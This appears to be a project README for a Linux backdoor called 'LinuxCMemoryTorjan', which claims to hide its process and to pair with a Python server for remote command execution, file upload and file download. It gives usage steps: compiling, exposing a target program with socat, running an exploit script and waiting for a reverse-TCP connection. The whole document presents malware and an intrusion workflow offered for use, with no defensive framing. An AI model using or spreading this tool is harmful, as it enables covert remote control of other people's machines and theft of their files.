# LinuxCMemoryTorjan

This is a backdoor program that implements process hiding under Linux and a server program implemented in python.

The server-side program has simple interactive functions, which can realize remote command execution, file upload, and file download.

## How to use
### Compile
```
make
```

### start service
```
socat tcp4-listen:4444,fork exec:./company
```

### attack
```
python exp.py
```

### wait reverse-tcp connection
```
python cmd_server.py
```
